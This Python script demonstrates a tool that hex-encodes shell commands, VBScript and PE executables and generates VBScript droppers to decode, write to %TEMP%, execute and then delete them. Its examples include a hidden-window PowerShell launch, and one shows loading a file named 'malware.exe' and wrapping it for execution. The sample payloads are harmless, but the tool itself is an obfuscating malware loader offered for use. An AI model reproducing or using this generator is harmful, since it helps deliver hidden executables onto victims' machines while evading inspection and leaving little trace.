#!/usr/bin/env python3
"""
Example usage of all three Hex Decoder Variants

Demonstrates:
1. CommandDecoder - for shell commands
2. ScriptDecoder - for VBScript/batch scripts
3. BinaryDecoder - for binary executables

Run with: python3 example_hex_decoder_variants.py
"""

from hex_decoder_variants import HexDecoderVariants, generate_all_variants


def example_1_command_decoder():
    """Example 1: Using CommandDecoder for shell commands"""
    print("\n" + "=" * 80)
    print("EXAMPLE 1: CommandDecoder")
    print("=" * 80)
    print("\nUse Case: Execute a PowerShell command")
    print("-" * 80)

    # Define the command to encode
    command = "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Write-Host 'Executed'\""

    print(f"\nOriginal Command:\n  {command}")

    # Generate the decoder
    vbs_code, metadata = HexDecoderVariants.create_command_decoder(command, execute=True)

    print(f"\nMetadata:")
    print(f"  Type: {metadata['type']}")
    print(f"  Function: {metadata['function_name']}")
    print(f"  Payload Type: {metadata['payload_type']}")
    print(f"  Command Length: {metadata['command_length']} chars")
    print(f"  Hex Length: {metadata['hex_length']} chars")
    print(f"  Code Size: {len(vbs_code)} bytes")
    print(f"  Optimization: {metadata['optimization']}")

    print(f"\nGenerated VBScript (first 40 lines):")
    print("-" * 80)
    lines = vbs_code.split('\n')
    for i, line in enumerate(lines[:40], 1):
        print(f"{i:2d}: {line}")
    if len(lines) > 40:
        print(f"... ({len(lines) - 40} more lines)")
    print("-" * 80)

    print("\nUsage:")
    print("  1. Save the VBS code to a file: script.vbs")
    print("  2. Execute: cscript.exe script.vbs")
    print("  3. The command will be decoded and executed")


def example_2_script_decoder():
    """Example 2: Using ScriptDecoder for VBScript payloads"""
    print("\n" + "=" * 80)
    print("EXAMPLE 2: ScriptDecoder")
    print("=" * 80)
    print("\nUse Case: Execute a multi-line VBScript")
    print("-" * 80)

    # Define the script to encode
    script = """' VBScript Payload
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
objShell.Run "cmd.exe /c tasklist", 1, False
WScript.Echo "Script executed"
"""

    print(f"\nOriginal Script:\n{script}")

    # Generate the decoder
    vbs_code, metadata = HexDecoderVariants.create_script_decoder(script, execute=True)

    print(f"\nMetadata:")
    print(f"  Type: {metadata['type']}")
    print(f"  Function: {metadata['function_name']}")
    print(f"  Payload Type: {metadata['payload_type']}")
    print(f"  Script Length: {metadata['script_length']} chars")
    print(f"  Hex Length: {metadata['hex_length']} chars")
    print(f"  Code Size: {len(vbs_code)} bytes")
    print(f"  Optimization: {metadata['optimization']}")
    print(f"  Execution Method: {metadata['execution_method']}")

    print(f"\nGenerated VBScript (first 40 lines):")
    print("-" * 80)
    lines = vbs_code.split('\n')
    for i, line in enumerate(lines[:40], 1):
        print(f"{i:2d}: {line}")
    if len(lines) > 40:
        print(f"... ({len(lines) - 40} more lines)")
    print("-" * 80)

    print("\nHow It Works:")
    print("  1. Decodes hex string to VBScript content")
    print("  2. Creates temporary file in %TEMP%")
    print("  3. Executes via cscript.exe")
    print("  4. Automatically deletes temporary file")


def example_3_binary_decoder():
    """Example 3: Using BinaryDecoder for PE executables"""
    print("\n" + "=" * 80)
    print("EXAMPLE 3: BinaryDecoder")
    print("=" * 80)
    print("\nUse Case: Execute a binary executable (PE file)")
    print("-" * 80)

    # Simulated PE header (MZ signature + minimal header)
    # In real usage, you'd load an actual executable
    binary_hex = "4d5a90000300000004000000ffff0000b8000000000000004000000000000000"

    print(f"\nBinary Data (hex):\n  {binary_hex}")
    print(f"  This represents a {len(binary_hex)//2} byte binary file")

    # Generate the decoder
    vbs_code, metadata = HexDecoderVariants.create_binary_decoder(binary_hex, execute=True)

    print(f"\nMetadata:")
    print(f"  Type: {metadata['type']}")
    print(f"  Function: {metadata['function_name']}")
    print(f"  Payload Type: {metadata['payload_type']}")
    print(f"  Binary Size: {metadata['binary_length']} bytes")
    print(f"  Hex Length: {metadata['hex_length']} chars")
    print(f"  Code Size: {len(vbs_code)} bytes")
    print(f"  Optimization: {metadata['optimization']}")
    print(f"  Execution Method: {metadata['execution_method']}")
    print(f"  Integrity Check: {metadata['integrity_check']}")

    print(f"\nGenerated VBScript (first 40 lines):")
    print("-" * 80)
    lines = vbs_code.split('\n')
    for i, line in enumerate(lines[:40], 1):
        print(f"{i:2d}: {line}")
    if len(lines) > 40:
        print(f"... ({len(lines) - 40} more lines)")
    print("-" * 80)

    print("\nHow It Works:")
    print("  1. Decodes hex to byte array")
    print("  2. Verifies size matches expected")
    print("  3. Uses ADODB.Stream to write binary file")
    print("  4. Executes the binary")
    print("  5. Automatically cleans up temporary file")


def example_4_all_variants():
    """Example 4: Generate all three variants for comparison"""
    print("\n" + "=" * 80)
    print("EXAMPLE 4: All Three Variants Comparison")
    print("=" * 80)
    print("\nGenerating all variants for the same payload...")
    print("-" * 80)

    # Sample payloads
    command = "echo test"
    script = "WScript.Echo 'test'"
    binary_hex = "4d5a9000"

    # Generate all variants
    variants = generate_all_variants(command, script, binary_hex)

    print("\nComparison Table:")
    print("-" * 80)
    print(f"{'Variant':<10} {'Type':<15} {'Code Size':<12} {'Optimization':<30}")
    print("-" * 80)

    for variant_type, variant_data in variants.items():
        meta = variant_data['metadata']
        code = variant_data['code']
        print(f"{variant_type:<10} {meta['type']:<15} {len(code):<12} {meta['optimization']:<30}")

    print("-" * 80)

    print("\nDetailed Metadata:")
    for variant_type, variant_data in variants.items():
        meta = variant_data['metadata']
        print(f"\n{variant_type.upper()}:")
        for key in sorted(meta.keys()):
            if meta[key] is not None:
                print(f"  {key:<20}: {meta[key]}")


def example_5_loading_binary_file():
    """Example 5: Load and encode a real binary file"""
    print("\n" + "=" * 80)
    print("EXAMPLE 5: Loading a Real Binary File")
    print("=" * 80)
    print("\nHow to encode a real binary file...")
    print("-" * 80)

    print("\nCode Example:")
    print("""
# Load a binary executable
with open("malware.exe", "rb") as f:
    binary_data = f.read()

# Generate decoder for the binary
vbs_code, metadata = HexDecoderVariants.create_binary_decoder(
    binary_data=binary_data,
    execute=True
)

# Display results
print(f"Binary size: {metadata['binary_length']} bytes")
print(f"Hex encoded: {metadata['hex_length']} characters")
print(f"VBS wrapper: {len(vbs_code)} bytes")
print(f"Total: {metadata['hex_length']//2 + len(vbs_code)} bytes")

# Save to file
with open("decoder.vbs", "w") as f:
    f.write(vbs_code)

# Execute
# cscript.exe decoder.vbs
""")

    print("-" * 80)
    print("\nKey Points:")
    print("  • Binary is converted to hex (2 chars per byte)")
    print("  • Decoder preserves all byte values (0x00-0xFF)")
    print("  • Integrity check ensures correct decoding")
    print("  • ADODB.Stream handles binary I/O safely")
    print("  • Temporary file is auto-deleted after execution")


def main():
    """Run all examples"""
    print("\n" + "=" * 80)
    print("HEX DECODER VARIANTS - COMPREHENSIVE EXAMPLES")
    print("=" * 80)

    try:
        example_1_command_decoder()
        example_2_script_decoder()
        example_3_binary_decoder()
        example_4_all_variants()
        example_5_loading_binary_file()

        print("\n" + "=" * 80)
        print("ALL EXAMPLES COMPLETED SUCCESSFULLY")
        print("=" * 80)
        print("\nFor more information, see:")
        print("  • HEX_DECODER_VARIANTS_GUIDE.md - Complete documentation")
        print("  • test_hex_decoder_variants.py - Test suite (21 tests)")
        print("  • hex_decoder_variants.py - Full implementation")
        print("\n")

    except Exception as e:
        print(f"\nError: {e}")
        import traceback
        traceback.print_exc()
        return 1

    return 0


if __name__ == "__main__":
    import sys
    sys.exit(main())
